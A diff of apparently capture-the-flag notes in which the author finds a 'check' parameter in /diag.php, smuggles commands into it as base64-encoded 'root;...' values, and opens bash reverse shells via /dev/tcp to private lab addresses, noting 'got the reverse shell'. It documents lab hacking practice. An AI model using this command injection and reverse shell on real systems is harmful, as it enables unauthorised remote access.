@@ -20,6 +20,15 @@ iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is pas
 
 5.find check param in /diag.php
 echo "root;cat user.txt" | base64
-get the user flag
+got the user flag
 
 6. bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+echo "root;echo -----------;bash -i >& /dev/tcp/10.10.12.26/9999 0>&1" | base64
+cm9vdDtlY2hvIC0tLS0tLS0tLS0tO2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTIuMjYvOTk5
+OSAwPiYxCg==
+
+request to /diag.php with check
+got the reverse shell
+
+7.
